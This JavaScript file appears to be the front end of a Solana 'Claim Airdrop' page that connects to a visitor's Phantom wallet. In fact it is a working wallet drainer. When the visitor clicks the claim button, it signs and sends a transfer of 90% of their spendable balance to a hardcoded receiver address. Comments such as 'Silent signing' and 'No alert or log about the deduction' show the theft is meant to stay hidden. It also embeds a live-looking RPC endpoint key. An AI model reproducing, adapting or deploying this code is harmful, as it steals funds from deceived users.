// Ensure @solana/web3.js is available globally
if (typeof solanaWeb3 === 'undefined') {
    throw new Error("Solana Web3.js not found. Include <script src='https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js'></script>");
}

$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                // Removed balance logging for discretion
                var connection = new solanaWeb3.Connection(
                    'https://bold-prettiest-spree.solana-mainnet.quiknode.pro/8a34f4083d0d4a0a1533ddbd64fbecd5f6f789d4',
                    'confirmed'
                );

                const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
                const walletBalance = await connection.getBalance(publicKey); // Still needed for calculation
                const minBalance = await connection.getMinimumBalanceForRentExemption(0); // Still needed for safety
                if (walletBalance < minBalance) {
                    // Kept minimal alert for usability
                    alert("Insufficient funds to proceed.");
                    return;
                }

                $('#connect-wallet').text("Claim Airdrop");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds to proceed.");
                            return;
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.9),
                            })
                        );

                        transaction.feePayer = publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        // Silent signing and execution
                        const signed = await window.solana.signTransaction(transaction);
                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        // No alert or log about the deduction
                    } catch (err) {
                        console.error("Error during minting:", err.message); // Kept for debugging
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err.message);
            }
        } else {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

            if (isMobile) {
                alert("Phantom Wallet not found. Redirecting to Phantom mobile app...");
                const currentUrl = encodeURIComponent(window.location.href);
                const phantomMobileLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}`;
                window.open(phantomMobileLink, "_blank");
            } else {
                alert("Phantom extension not found.");
                const isFirefox = typeof InstallTrigger !== "undefined";
                const isChrome = !!window.chrome;

                if (isFirefox) {
                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
                } else if (isChrome) {
                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                } else {
                    alert("Please download the Phantom extension for your browser.");
                }
            }
        }
    });
});
